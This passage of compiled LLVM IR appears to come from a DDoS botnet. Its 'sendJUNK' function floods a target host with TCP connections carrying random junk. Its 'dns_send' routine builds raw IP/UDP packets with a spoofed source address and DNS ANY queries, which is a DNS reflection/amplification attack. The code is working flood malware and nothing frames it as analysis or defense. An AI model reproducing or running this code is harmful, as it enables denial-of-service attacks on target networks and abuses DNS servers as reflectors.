  %65 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #3, !srcloc !9
  %66 = getelementptr inbounds %struct.state_t, %struct.state_t* %45, i64 0, i32 0
  %67 = load i32, i32* %66, align 8
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = sdiv i32 %67, 64
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %72
  %74 = load i64, i64* %73, align 8
  %75 = or i64 %70, %74
  store i64 %75, i64* %73, align 8
  store i64 0, i64* %36, align 8
  store i64 10000, i64* %37, align 8
  %76 = load i32, i32* %66, align 8
  %77 = add nsw i32 %76, 1
  %78 = call i32 @select(i32 %77, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %5, %struct.__sigset_t* null, %struct.timeval* nonnull %6) #3
  switch i32 %78, label %110 [
    i32 1, label %79
    i32 -1, label %88
  ]

; <label>:79:                                     ; preds = %64
  store i32 4, i32* %7, align 4
  %80 = load i32, i32* %66, align 8
  %81 = call i32 @getsockopt(i32 %80, i32 1, i32 4, i8* nonnull %38, i32* nonnull %7) #3
  %82 = load i32, i32* %8, align 4
  %83 = icmp eq i32 %82, 0
  br i1 %83, label %87, label %84

; <label>:84:                                     ; preds = %79
  %85 = load i32, i32* %66, align 8
  %86 = call i32 @close(i32 %85) #3
  br label %87

; <label>:87:                                     ; preds = %79, %84
  %.sink = phi i8 [ 0, %84 ], [ 2, %79 ]
  store i8 %.sink, i8* %46, align 4
  br label %110

; <label>:88:                                     ; preds = %64
  %89 = load i32, i32* %66, align 8
  %90 = call i32 @close(i32 %89) #3
  store i8 0, i8* %46, align 4
  br label %110

; <label>:91:                                     ; preds = %.lr.ph
  %92 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %39) #3, !srcloc !10
  %93 = getelementptr inbounds %struct.state_t, %struct.state_t* %45, i64 0, i32 0
  %94 = load i32, i32* %93, align 8
  %95 = srem i32 %94, 64
  %96 = zext i32 %95 to i64
  %97 = shl i64 1, %96
  %98 = sdiv i32 %94, 64
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %99
  %101 = load i64, i64* %100, align 8
  %102 = or i64 %97, %101
  store i64 %102, i64* %100, align 8
  store i64 0, i64* %40, align 8
  store i64 10000, i64* %41, align 8
  %103 = load i32, i32* %93, align 8
  %104 = add nsw i32 %103, 1
  %105 = call i32 @select(i32 %104, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %5, %struct.timeval* nonnull %6) #3
  %106 = icmp eq i32 %105, 0
  br i1 %106, label %110, label %107

; <label>:107:                                    ; preds = %91
  %108 = load i32, i32* %93, align 8
  %109 = call i32 @close(i32 %108) #3
  store i8 0, i8* %46, align 4
  br label %110

; <label>:110:                                    ; preds = %64, %91, %.lr.ph, %63, %60, %88, %87, %107
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %111 = icmp slt i64 %indvars.iv.next, %42
  br i1 %111, label %.lr.ph, label %.loopexit.loopexit

._crit_edge.loopexit:                             ; preds = %.loopexit
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %18
  call void @llvm.stackrestore(i8* %22)
  br label %112

; <label>:112:                                    ; preds = %3, %._crit_edge
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @realrand(i32, i32) local_unnamed_addr #1 {
  %3 = tail call i64 @time(i64* null) #3
  %4 = tail call i32 @getpid() #3
  %5 = zext i32 %4 to i64
  %6 = add i64 %5, %3
  %7 = trunc i64 %6 to i32
  tail call void @srand(i32 %7) #3
  %8 = tail call i32 @rand() #3
  %9 = sub i32 1, %0
  %10 = add i32 %9, %1
  %11 = srem i32 %8, %10
  %12 = add nsw i32 %11, %0
  ret i32 %12
}

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @makeRandomShit(i8* nocapture, i32) local_unnamed_addr #1 {
  %3 = tail call i64 @time(i64* null) #3
  %4 = trunc i64 %3 to i32
  tail call void @srand(i32 %4) #3
  %5 = icmp sgt i32 %1, 0
  br i1 %5, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %6 = tail call i32 @rand() #3
  %7 = srem i32 %6, 255
  %8 = add nsw i32 %7, 1
  %9 = trunc i32 %8 to i8
  %10 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %9, i8* %10, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.timeval, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = tail call i32 @getdtablesize() #3
  %10 = sdiv i32 %9, 2
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = trunc i32 %1 to i16
  %13 = tail call zeroext i16 @htons(i16 zeroext %12) #18
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %13, i16* %14, align 2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %16 = call i32 @getHost(i8* %0, %struct.in_addr* %15)
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %105

; <label>:18:                                     ; preds = %3
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 3, i64 0
  %20 = bitcast i8* %19 to i64*
  store i64 0, i64* %20, align 4
  %21 = zext i32 %10 to i64
  %22 = tail call i8* @llvm.stacksave()
  %23 = alloca %struct.state_t, i64 %21, align 16
  %24 = bitcast %struct.state_t* %23 to i8*
  %25 = sext i32 %10 to i64
  %26 = mul nsw i64 %25, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %24, i8 0, i64 %26, i32 16, i1 false)
  %27 = tail call noalias i8* @malloc(i64 1024) #3
  tail call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 1024, i32 1, i1 false)
  %28 = tail call i64 @time(i64* null) #3
  %29 = zext i32 %2 to i64
  %30 = add i64 %28, %29
  %sext = shl i64 %30, 32
  %31 = ashr exact i64 %sext, 32
  %32 = call i64 @time(i64* null) #3
  %33 = icmp sgt i64 %31, %32
  br i1 %33, label %.preheader.lr.ph, label %._crit_edge

.preheader.lr.ph:                                 ; preds = %18
  %34 = icmp sgt i32 %9, 1
  %35 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %36 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %37 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  %38 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  %39 = bitcast i32* %8 to i8*
  %40 = sext i32 %10 to i64
  br label %.preheader

.loopexit.loopexit:                               ; preds = %103
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader
  %41 = call i64 @time(i64* null) #3
  %42 = icmp sgt i64 %31, %41
  br i1 %42, label %.preheader, label %._crit_edge.loopexit

.preheader:                                       ; preds = %.preheader.lr.ph, %.loopexit
  br i1 %34, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %103
  %indvars.iv = phi i64 [ %indvars.iv.next, %103 ], [ 0, %.lr.ph.preheader ]
  %43 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv
  %44 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv, i32 1
  %45 = load i8, i8* %44, align 4
  switch i8 %45, label %103 [
    i8 0, label %46
    i8 1, label %62
    i8 2, label %89
  ]

; <label>:46:                                     ; preds = %.lr.ph
  %47 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %48 = getelementptr inbounds %struct.state_t, %struct.state_t* %43, i64 0, i32 0
  store i32 %47, i32* %48, align 8
  %49 = call i32 (i32, i32, ...) @fcntl(i32 %47, i32 3, i8* null) #3
  %50 = or i32 %49, 2048
  %51 = call i32 (i32, i32, ...) @fcntl(i32 %47, i32 4, i32 %50) #3
  %52 = call i32 @connect(i32 %47, %struct.sockaddr* nonnull %35, i32 16) #3
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %58

; <label>:54:                                     ; preds = %46
  %55 = tail call i32* @__errno_location() #18
  %56 = load i32, i32* %55, align 4
  %57 = icmp eq i32 %56, 115
  br i1 %57, label %61, label %58

; <label>:58:                                     ; preds = %54, %46
  %59 = load i32, i32* %48, align 8
  %60 = call i32 @close(i32 %59) #3
  br label %103

; <label>:61:                                     ; preds = %54
  store i8 1, i8* %44, align 4
  br label %103

; <label>:62:                                     ; preds = %.lr.ph
  %63 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %36) #3, !srcloc !11
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %43, i64 0, i32 0
  %65 = load i32, i32* %64, align 8
  %66 = srem i32 %65, 64
  %67 = zext i32 %66 to i64
  %68 = shl i64 1, %67
  %69 = sdiv i32 %65, 64
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %70
  %72 = load i64, i64* %71, align 8
  %73 = or i64 %68, %72
  store i64 %73, i64* %71, align 8
  store i64 0, i64* %37, align 8
  store i64 10000, i64* %38, align 8
  %74 = load i32, i32* %64, align 8
  %75 = add nsw i32 %74, 1
  %76 = call i32 @select(i32 %75, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %5, %struct.__sigset_t* null, %struct.timeval* nonnull %6) #3
  switch i32 %76, label %103 [
    i32 1, label %77
    i32 -1, label %86
  ]

; <label>:77:                                     ; preds = %62
  store i32 4, i32* %7, align 4
  %78 = load i32, i32* %64, align 8
  %79 = call i32 @getsockopt(i32 %78, i32 1, i32 4, i8* nonnull %39, i32* nonnull %7) #3
  %80 = load i32, i32* %8, align 4
  %81 = icmp eq i32 %80, 0
  br i1 %81, label %85, label %82

; <label>:82:                                     ; preds = %77
  %83 = load i32, i32* %64, align 8
  %84 = call i32 @close(i32 %83) #3
  br label %85

; <label>:85:                                     ; preds = %77, %82
  %.sink = phi i8 [ 0, %82 ], [ 2, %77 ]
  store i8 %.sink, i8* %44, align 4
  br label %103

; <label>:86:                                     ; preds = %62
  %87 = load i32, i32* %64, align 8
  %88 = call i32 @close(i32 %87) #3
  store i8 0, i8* %44, align 4
  br label %103

; <label>:89:                                     ; preds = %.lr.ph
  %90 = call i32 @realrand(i32 32, i32 1024)
  call void @makeRandomShit(i8* %27, i32 %90)
  %91 = getelementptr inbounds %struct.state_t, %struct.state_t* %43, i64 0, i32 0
  %92 = load i32, i32* %91, align 8
  %93 = sext i32 %90 to i64
  %94 = call i64 @send(i32 %92, i8* %27, i64 %93, i32 16384) #3
  %95 = icmp eq i64 %94, -1
  br i1 %95, label %96, label %103

; <label>:96:                                     ; preds = %89
  %97 = tail call i32* @__errno_location() #18
  %98 = load i32, i32* %97, align 4
  %99 = icmp eq i32 %98, 11
  br i1 %99, label %103, label %100

; <label>:100:                                    ; preds = %96
  %101 = load i32, i32* %91, align 8
  %102 = call i32 @close(i32 %101) #3
  store i8 0, i8* %44, align 4
  br label %103

; <label>:103:                                    ; preds = %62, %96, %.lr.ph, %61, %58, %86, %85, %100, %89
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %104 = icmp slt i64 %indvars.iv.next, %40
  br i1 %104, label %.lr.ph, label %.loopexit.loopexit

._crit_edge.loopexit:                             ; preds = %.loopexit
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %18
  call void @llvm.stackrestore(i8* %22)
  br label %105

; <label>:105:                                    ; preds = %3, %._crit_edge
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @dns_format(i8* nocapture, i8* nocapture) local_unnamed_addr #1 {
  %strlen = tail call i64 @strlen(i8* %1)
  %endptr = getelementptr i8, i8* %1, i64 %strlen
  %3 = bitcast i8* %endptr to i16*
  store i16 46, i16* %3, align 1
  %strlenfirst = load i8, i8* %1, align 1
  %4 = icmp eq i8 %strlenfirst, 0
  br i1 %4, label %._crit_edge29, label %.lr.ph28.preheader

.lr.ph28.preheader:                               ; preds = %2
  br label %.lr.ph28

.lr.ph28:                                         ; preds = %.lr.ph28.preheader, %40
  %indvars.iv36 = phi i64 [ %indvars.iv.next37, %40 ], [ 0, %.lr.ph28.preheader ]
  %indvars.iv32 = phi i64 [ %indvars.iv.next33, %40 ], [ 1, %.lr.ph28.preheader ]
  %.01625 = phi i32 [ %.2, %40 ], [ 0, %.lr.ph28.preheader ]
  %.01724 = phi i8* [ %.219, %40 ], [ %0, %.lr.ph28.preheader ]
  %5 = add i64 %indvars.iv36, -1
  %6 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv36
  %7 = load i8, i8* %6, align 1
  %8 = icmp eq i8 %7, 46
  br i1 %8, label %9, label %40

; <label>:9:                                      ; preds = %.lr.ph28
  %10 = trunc i64 %indvars.iv36 to i32
  %11 = sub nsw i32 %10, %.01625
  %12 = trunc i32 %11 to i8
  store i8 %12, i8* %.01724, align 1
  %.11820 = getelementptr inbounds i8, i8* %.01724, i64 1
  %13 = sext i32 %.01625 to i64
  %14 = icmp sgt i64 %indvars.iv36, %13
  br i1 %14, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %9
  %15 = sext i32 %.01625 to i64
  %16 = sub i64 %indvars.iv32, %15
  %17 = sub i64 %indvars.iv36, %15
  %18 = sub i64 %5, %15
  %xtraiter = and i64 %17, 7
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %.lr.ph.prol, %.lr.ph.prol.preheader
  %indvars.iv.prol = phi i64 [ %15, %.lr.ph.prol.preheader ], [ %indvars.iv.next.prol, %.lr.ph.prol ]
  %.11822.prol = phi i8* [ %.11820, %.lr.ph.prol.preheader ], [ %.118.prol, %.lr.ph.prol ]
  %prol.iter = phi i64 [ %xtraiter, %.lr.ph.prol.preheader ], [ %prol.iter.sub, %.lr.ph.prol ]
  %19 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.prol
  %20 = load i8, i8* %19, align 1
  store i8 %20, i8* %.11822.prol, align 1
  %indvars.iv.next.prol = add nsw i64 %indvars.iv.prol, 1
  %.118.prol = getelementptr inbounds i8, i8* %.11822.prol, i64 1
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph.prol.loopexit.unr-lcssa, label %.lr.ph.prol, !llvm.loop !12

.lr.ph.prol.loopexit.unr-lcssa:                   ; preds = %.lr.ph.prol
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader, %.lr.ph.prol.loopexit.unr-lcssa
  %indvars.iv.unr = phi i64 [ %15, %.lr.ph.preheader ], [ %indvars.iv.next.prol, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.11822.unr = phi i8* [ %.11820, %.lr.ph.preheader ], [ %.118.prol, %.lr.ph.prol.loopexit.unr-lcssa ]
  %21 = icmp ult i64 %18, 7
  br i1 %21, label %._crit_edge.loopexit, label %.lr.ph.preheader.new

.lr.ph.preheader.new:                             ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph, %.lr.ph.preheader.new
  %indvars.iv = phi i64 [ %indvars.iv.unr, %.lr.ph.preheader.new ], [ %indvars.iv.next.7, %.lr.ph ]
  %.11822 = phi i8* [ %.11822.unr, %.lr.ph.preheader.new ], [ %.118.7, %.lr.ph ]
  %22 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv
  %23 = load i8, i8* %22, align 1
  store i8 %23, i8* %.11822, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %.118 = getelementptr inbounds i8, i8* %.11822, i64 1
  %24 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next
  %25 = load i8, i8* %24, align 1
  store i8 %25, i8* %.118, align 1
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %.118.1 = getelementptr inbounds i8, i8* %.11822, i64 2
  %26 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.1
  %27 = load i8, i8* %26, align 1
  store i8 %27, i8* %.118.1, align 1
  %indvars.iv.next.2 = add nsw i64 %indvars.iv, 3
  %.118.2 = getelementptr inbounds i8, i8* %.11822, i64 3
  %28 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.2
  %29 = load i8, i8* %28, align 1
  store i8 %29, i8* %.118.2, align 1
  %indvars.iv.next.3 = add nsw i64 %indvars.iv, 4
  %.118.3 = getelementptr inbounds i8, i8* %.11822, i64 4
  %30 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.3
  %31 = load i8, i8* %30, align 1
  store i8 %31, i8* %.118.3, align 1
  %indvars.iv.next.4 = add nsw i64 %indvars.iv, 5
  %.118.4 = getelementptr inbounds i8, i8* %.11822, i64 5
  %32 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.4
  %33 = load i8, i8* %32, align 1
  store i8 %33, i8* %.118.4, align 1
  %indvars.iv.next.5 = add nsw i64 %indvars.iv, 6
  %.118.5 = getelementptr inbounds i8, i8* %.11822, i64 6
  %34 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.5
  %35 = load i8, i8* %34, align 1
  store i8 %35, i8* %.118.5, align 1
  %indvars.iv.next.6 = add nsw i64 %indvars.iv, 7
  %.118.6 = getelementptr inbounds i8, i8* %.11822, i64 7
  %36 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.6
  %37 = load i8, i8* %36, align 1
  store i8 %37, i8* %.118.6, align 1
  %indvars.iv.next.7 = add nsw i64 %indvars.iv, 8
  %.118.7 = getelementptr inbounds i8, i8* %.11822, i64 8
  %exitcond.7 = icmp eq i64 %indvars.iv.next.7, %indvars.iv36
  br i1 %exitcond.7, label %._crit_edge.loopexit.unr-lcssa, label %.lr.ph

._crit_edge.loopexit.unr-lcssa:                   ; preds = %.lr.ph
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph.prol.loopexit, %._crit_edge.loopexit.unr-lcssa
  %scevgep = getelementptr i8, i8* %.01724, i64 %16
  %38 = trunc i64 %indvars.iv36 to i32
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %9
  %.1.lcssa = phi i32 [ %.01625, %9 ], [ %38, %._crit_edge.loopexit ]
  %.118.lcssa = phi i8* [ %.11820, %9 ], [ %scevgep, %._crit_edge.loopexit ]
  %39 = add nsw i32 %.1.lcssa, 1
  br label %40

; <label>:40:                                     ; preds = %.lr.ph28, %._crit_edge
  %.219 = phi i8* [ %.118.lcssa, %._crit_edge ], [ %.01724, %.lr.ph28 ]
  %.2 = phi i32 [ %39, %._crit_edge ], [ %.01625, %.lr.ph28 ]
  %indvars.iv.next37 = add nuw nsw i64 %indvars.iv36, 1
  %41 = tail call i64 @strlen(i8* nonnull %1) #15
  %42 = icmp ult i64 %indvars.iv.next37, %41
  %indvars.iv.next33 = add nuw i64 %indvars.iv32, 1
  br i1 %42, label %.lr.ph28, label %._crit_edge29.loopexit

._crit_edge29.loopexit:                           ; preds = %40
  br label %._crit_edge29

._crit_edge29:                                    ; preds = %._crit_edge29.loopexit, %2
  %.017.lcssa = phi i8* [ %0, %2 ], [ %.219, %._crit_edge29.loopexit ]
  store i8 0, i8* %.017.lcssa, align 1
  ret void
}

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @dns_hdr_create(%struct.dns_hdr* nocapture) local_unnamed_addr #1 {
  %2 = tail call i32 @getpid() #3
  %3 = trunc i32 %2 to i16
  %4 = tail call zeroext i16 @htons(i16 zeroext %3) #18
  %5 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %0, i64 0, i32 0
  store i16 %4, i16* %5, align 2
  %6 = tail call zeroext i16 @htons(i16 zeroext 256) #18
  %7 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %0, i64 0, i32 1
  store i16 %6, i16* %7, align 2
  %8 = tail call zeroext i16 @htons(i16 zeroext 1) #18
  %9 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %0, i64 0, i32 2
  store i16 %8, i16* %9, align 2
  %10 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %0, i64 0, i32 3
  store i16 0, i16* %10, align 2
  %11 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %0, i64 0, i32 4
  store i16 0, i16* %11, align 2
  %12 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %0, i64 0, i32 5
  store i16 0, i16* %12, align 2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @dns_send(i8*, i32, i8*, i8* nocapture readonly) local_unnamed_addr #1 {
  %5 = alloca [128 x i8], align 16
  %6 = alloca [32 x i8], align 16
  %7 = alloca [4096 x i8], align 16
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = bitcast [128 x i8]* %5 to %struct.dns_hdr*
  call void @dns_hdr_create(%struct.dns_hdr* nonnull %9)
  %10 = getelementptr inbounds [128 x i8], [128 x i8]* %5, i64 0, i64 12
  %11 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i64 0, i64 0
  %12 = call i8* @strcpy(i8* nonnull %11, i8* %3) #3
  call void @dns_format(i8* %10, i8* nonnull %11)
  %13 = call i64 @strlen(i8* %10) #15
  %14 = add i64 %13, 13
  %15 = getelementptr inbounds [128 x i8], [128 x i8]* %5, i64 0, i64 %14
  %16 = call zeroext i16 @htons(i16 zeroext 255) #18
  %17 = bitcast i8* %15 to i16*
  store i16 %16, i16* %17, align 2
  %18 = call zeroext i16 @htons(i16 zeroext 1) #18
  %19 = getelementptr inbounds i8, i8* %15, i64 2
  %20 = bitcast i8* %19 to i16*
  store i16 %18, i16* %20, align 2
  %21 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %21, i8 0, i64 4096, i32 16, i1 false)
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 20
  %23 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 28
  %24 = getelementptr inbounds [128 x i8], [128 x i8]* %5, i64 0, i64 0
  %25 = call i64 @strlen(i8* %10) #15
  %26 = add i64 %25, 18
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %23, i8* nonnull %24, i64 %26, i32 4, i1 false)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = call zeroext i16 @htons(i16 zeroext 53) #18
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = call i32 @inet_addr(i8* %2) #3
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2, i32 0
  store i32 %30, i32* %31, align 4
  store i8 69, i8* %21, align 16
  %32 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 1
  store i8 0, i8* %32, align 1
  %33 = call i64 @strlen(i8* %10) #15
  %34 = add i64 %33, 45
  %35 = trunc i64 %34 to i16
  %36 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 2
  %37 = bitcast i8* %36 to i16*
  store i16 %35, i16* %37, align 2
  %38 = call i32 @rand_cmwc()
  %39 = call i32 @htonl(i32 %38) #18
  %40 = trunc i32 %39 to i16
  %41 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 4
  %42 = bitcast i8* %41 to i16*
  store i16 %40, i16* %42, align 4
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 6
  %44 = bitcast i8* %43 to i16*
  store i16 0, i16* %44, align 2
  %45 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 8
  store i8 64, i8* %45, align 8
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 9
  store i8 17, i8* %46, align 1
  %47 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 10
  %48 = bitcast i8* %47 to i16*
  store i16 0, i16* %48, align 2
  %49 = call i32 @inet_addr(i8* %0) #3
  %50 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 12
  %51 = bitcast i8* %50 to i32*
  store i32 %49, i32* %51, align 4
  %52 = load i32, i32* %31, align 4
  %53 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 16
  %54 = bitcast i8* %53 to i32*
  store i32 %52, i32* %54, align 16
  %55 = bitcast [4096 x i8]* %7 to i16*
  %56 = load i16, i16* %37, align 2
  %57 = zext i16 %56 to i32
  %58 = call zeroext i16 @csum(i16* nonnull %55, i32 %57)
  store i16 %58, i16* %48, align 2
  %59 = trunc i32 %1 to i16
  %60 = call zeroext i16 @htons(i16 zeroext %59) #18
  %61 = bitcast i8* %22 to i16*
  store i16 %60, i16* %61, align 4
  %62 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 22
  %63 = bitcast i8* %62 to i16*
  store i16 %28, i16* %63, align 2
  %64 = call i64 @strlen(i8* %10) #15
  %65 = add i64 %64, 25
  %66 = trunc i64 %65 to i16
  %67 = call zeroext i16 @htons(i16 zeroext %66) #18
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 24
  %69 = bitcast i8* %68 to i16*
  store i16 %67, i16* %69, align 8
  %70 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 26
  %71 = bitcast i8* %70 to i16*
  store i16 0, i16* %71, align 2
  %72 = call i32 @inet_addr(i8* %0) #3
  %73 = load i32, i32* %31, align 4
  %74 = call i64 @strlen(i8* %10) #15
  %75 = add i64 %74, 25
  %76 = trunc i64 %75 to i16
  %77 = call zeroext i16 @htons(i16 zeroext %76) #18
  %78 = add i64 %74, 37
  %79 = trunc i64 %78 to i32
  %sext = shl i64 %78, 32
  %80 = ashr exact i64 %sext, 32
  %81 = call noalias i8* @malloc(i64 %80) #3
  %.sroa.05.0..sroa_cast = bitcast i8* %81 to i32*
  store i32 %72, i32* %.sroa.05.0..sroa_cast, align 1
  %.sroa.2.0..sroa_idx = getelementptr inbounds i8, i8* %81, i64 4
  %.sroa.2.0..sroa_cast = bitcast i8* %.sroa.2.0..sroa_idx to i32*
  store i32 %73, i32* %.sroa.2.0..sroa_cast, align 1
  %.sroa.3.0..sroa_raw_idx = getelementptr inbounds i8, i8* %81, i64 8
  store i8 0, i8* %.sroa.3.0..sroa_raw_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %81, i64 9
  store i8 17, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx = getelementptr inbounds i8, i8* %81, i64 10
  %.sroa.5.0..sroa_cast = bitcast i8* %.sroa.5.0..sroa_idx to i16*
  store i16 %77, i16* %.sroa.5.0..sroa_cast, align 1
  %82 = getelementptr inbounds i8, i8* %81, i64 12
  %83 = call i64 @strlen(i8* %10) #15
  %84 = add i64 %83, 25
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %82, i8* %22, i64 %84, i32 1, i1 false)
  %85 = bitcast i8* %81 to i16*
  %86 = call zeroext i16 @csum(i16* %85, i32 %79)
  store i16 %86, i16* %71, align 2
  %87 = call i32 @socket(i32 2, i32 3, i32 255) #3
  %88 = icmp eq i32 %87, -1
  br i1 %88, label %95, label %89

; <label>:89:                                     ; preds = %4
  %90 = load i16, i16* %37, align 2
  %91 = zext i16 %90 to i64
  %92 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %93 = call i64 @sendto(i32 %87, i8* nonnull %21, i64 %91, i32 0, %struct.sockaddr* nonnull %92, i32 16) #3
  call void @free(i8* %81) #3
